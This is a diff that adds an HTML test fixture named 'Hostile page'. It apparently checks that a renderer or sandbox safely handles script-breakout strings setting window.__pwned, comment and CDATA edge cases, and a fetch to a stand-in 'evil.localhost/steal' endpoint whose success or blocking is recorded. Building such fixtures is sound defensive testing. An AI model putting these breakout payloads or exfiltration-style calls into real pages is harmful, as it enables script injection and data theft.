@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Hostile  </title>
+    <link rel="stylesheet" href="assets/style.css" />
+  </head>
+  <body>
+    <h1 id="hostile-title">Hostile page</h1>
+    <p id="payload-text">
+      &lt;/script&gt;&lt;script&gt;window.__pwned=1&lt;/script&gt;
+      <!-- not a comment end -->
+      ]]> &amp; text
+    </p>
+    <script>
+      var a = "<\/script><script>window.__pwned = 'a'<\/script>";
+      var b = "<!-- window.__pwned = 'b' -->";
+      var c = 'line sep:   para sep:   cdata: ]]>';
+      document.body.setAttribute('data-hostile-ok', String(a.length + b.length + c.length));
+      fetch(window.__EVIL_URL__ || 'http://evil.localhost:6000/steal').then(
+        function () {
+          document.body.setAttribute('data-fetch', 'ok');
+        },
+        function () {
+          document.body.setAttribute('data-fetch', 'blocked');
+        },
+      );
+    </script>
+  </body>
+</html>
